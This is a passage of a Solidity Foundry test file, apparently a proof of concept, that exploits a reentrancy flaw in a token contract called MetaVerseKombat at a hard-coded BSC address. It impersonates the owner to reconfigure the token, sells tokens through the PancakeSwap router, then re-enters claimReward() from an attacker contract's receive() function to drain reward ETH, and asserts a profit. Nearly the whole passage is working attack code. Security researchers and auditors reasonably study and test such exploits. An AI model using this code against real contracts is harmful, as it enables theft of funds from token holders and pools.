    function claimReward() external;
    function owner() external view returns (address);
    function setSwapAndLiquifyEnabled(bool _enabled, uint256 _minTokensBeforeSwap) external;
    function update_AntiWhaleLimits(uint256 maxAntiWhaleLimits, uint256 minAntiWhaleLimits) external;
    function set_sellTimeInterval(uint256 sellTimeInterval) external;
    function excludedFromFee(address walletaddress) external;
    function pancakePair() external view returns (address);
}

interface IPancakeRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function WETH() external pure returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x3405ff989F8bb8Efd6C85Ad6B29219D3383A5FB0;
    address attacker = address(this);
    AttackerContract public attackerContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address
        address owner = IMetaVerseKombat(TARGET).owner();

        // Impersonate owner to initialize contract
        vm.startPrank(owner);

        // Initialize the contract with dummy marketing wallet and BSC router
        address marketingWallet = address(0x1234567890123456789012345678901234567890);
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeSwap v2 router
        IMetaVerseKombat(TARGET).Initialize(marketingWallet, router);

        // Enable swap and liquify with low threshold
        IMetaVerseKombat(TARGET).setSwapAndLiquifyEnabled(true, 1 ether);

        // Remove anti-whale limits
        IMetaVerseKombat(TARGET).update_AntiWhaleLimits(type(uint256).max, 0);

        // Set sell time interval to 0
        IMetaVerseKombat(TARGET).set_sellTimeInterval(0);

        // Exclude attacker from fees to avoid complications
        IMetaVerseKombat(TARGET).excludedFromFee(address(this));

        vm.stopPrank();

        // Deploy attacker contract
        attackerContract = new AttackerContract();

        // Give attacker contract some ETH for gas
        deal(address(attackerContract), 10 ether);

        // Transfer tokens to attacker contract from owner
        vm.prank(owner);
        IMetaVerseKombat(TARGET).transfer(address(attackerContract), 10000 * 10**18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Set token address in attacker contract
        attackerContract.setToken(TARGET);

        // Generate rewards by selling some tokens
        // First approve router
        vm.prank(address(attackerContract));
        IMetaVerseKombat(TARGET).approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, type(uint256).max);

        // Sell tokens to generate reward pool ETH
        uint256 sellAmount = 1000 * 10**18;
        attackerContract.executeSell(TARGET, sellAmount);

        // Get initial balance
        uint256 attackerInitialBalance = address(attackerContract).balance;

        // Execute reentrancy attack
        attackerContract.startAttack();

        // Get final balance
        uint256 attackerFinalBalance = address(attackerContract).balance;

        // Verify profit
        assertGt(attackerFinalBalance, attackerInitialBalance, "Attacker balance should increase");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

contract AttackerContract {
    IMetaVerseKombat public token;
    uint256 public reentrancyCount = 0;
    uint256 public constant MAX_REENTRANCY = 5;

    constructor() {}

    function setToken(address _token) public {
        token = IMetaVerseKombat(_token);
    }

    function executeSell(address tokenAddress, uint256 amount) public {
        token = IMetaVerseKombat(tokenAddress);
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

        address[] memory path = new address[](2);
        path[0] = tokenAddress;
        path[1] = IPancakeRouter(router).WETH();

        token.approve(router, amount);

        IPancakeRouter(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function startAttack() public {
        reentrancyCount = 0;
        token.claimReward();
    }

    receive() external payable {
        if (reentrancyCount < MAX_REENTRANCY) {
            reentrancyCount++;
            token.claimReward();
        }
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}

